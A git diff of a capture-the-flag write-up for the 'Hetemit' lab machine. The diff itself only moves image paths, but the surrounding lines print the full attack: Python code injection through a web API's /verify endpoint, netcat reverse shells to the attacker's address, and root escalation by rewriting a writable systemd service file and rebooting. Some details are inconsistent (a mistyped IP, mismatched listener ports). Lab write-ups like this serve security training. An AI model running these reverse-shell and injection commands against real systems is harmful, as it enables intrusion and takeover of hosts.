@@ -162,9 +162,9 @@ Nmap done: 1 IP address (1 host up) scanned in 54.04 seconds
 ```
 
 Visiting web server on port 80.
-![](Hetemit1.png)
+![](Images/Hetemit1.png)
 Directory brute forcing gave us nothing.
-![](Hetemit2.png)
+![](Images/Hetemit2.png)
 Port 50000 has website kind of api with **Werkzeug/1.0.1 Python/3.6.8** given options like
 
 /generate, /verify
@@ -174,30 +174,30 @@ Curl -s option for silence and -I for interactive
 curl -i or -si http://IP
 ```
 
-![](Hetemit3.png)
+![](Images/Hetemit3.png)
 showing kind of hint **{‘email@domain’}** lets try to put some email
-![](Hetemit4.png)
+![](Images/Hetemit4.png)
 The earlier response clues us in that an email is required..
-![](Hetemit5.png)
+![](Images/Hetemit5.png)
 Now, code is generated. use this code in code parameter in POST request.
-![](Hetemit6.png)
+![](Images/Hetemit6.png)
 An attempt to validate the invite code reveals a familiar and ominous error. Other than API Fuzzing, we can try submitting other value to test if the application performs evaluation.
-![](Hetemit7.png)
+![](Images/Hetemit7.png)
 
 ### Exploitation
 Knowing the server runs `Python/3.6.8` (thanks, `nmap`), we decide to try the powerful but dangerous `os` module. We can try to command injection using **python os module**.
-![](Hetemit8.png)
-![](Hetemit9.png)
+![](Images/Hetemit8.png)
+![](Images/Hetemit9.png)
 With `os` access confirmed, it’s time for a reverse shell. We set up a listener on port 18000 as it was open.
-![](Hetemit10.png)
+![](Images/Hetemit10.png)
 Then, we connect back using a reverse shell.
 ```sh
 curl -i http://192.168.200.117:50000/verify -X POST --data "code=os.system('nc 192.168.45.178 18000 -e /bin/bash)"
 ```
 
-![](Hetemit11.png)
+![](Images/Hetemit11.png)
 We got the shell.
-![](Hetemit12.png)
+![](Images/Hetemit12.png)
 **Here, to stabilize the shell with below command as it was using python3.**
 ```python
 python3 -c 'import pty;pty.spawn("/bin/bash")'
@@ -207,27 +207,27 @@ python3 -c 'import pty;pty.spawn("/bin/bash")'
 
 #### Enumeration
 1. Sudo
-![](Hetemit13.png)
+![](Images/Hetemit13.png)
 2. SUID (Found nothing interesting)
 ```sh
 find / -perm -u=s -type f 2>/dev/null
 ```
-![](Hetemit14.png)
+![](Images/Hetemit14.png)
 3.  we search for writable configuration files.
 ```sh
 find /etc -type f -writable 2>/dev/null
 ```
-![](Hetemit15.png)
+![](Images/Hetemit15.png)
 The writable **pythonapp.service** file suggests a system service configuration. Checking our `sudo` privileges, we see a useful misconfiguration:
 
 ### Modifying the Service File
 
 Inspecting the contents of **pythonapp.service**, we see an opportunity for escalation.
 Original content
-![](Hetemit16.png)
+![](Images/Hetemit16.png)
 Modified content
 I don't have modified POC. But, we changed the value of ExecStart to `nc 192.169.45.178 80 -e /bin/bash` and User value to `root`.
-![](Hetemit17.png)
+![](Images/Hetemit17.png)
 
 Now we restart our listener on port `1337` and initiate a reboot to activate our modified service. Which was we found in `sudo -l`.
 ```sh
@@ -235,7 +235,7 @@ sudo /sbin/reboot
 ```
 
 Before running above command, we started the nc on port 80 and received the shell.
-![](Hetemit18.png)
+![](Images/Hetemit18.png)
 
 
 
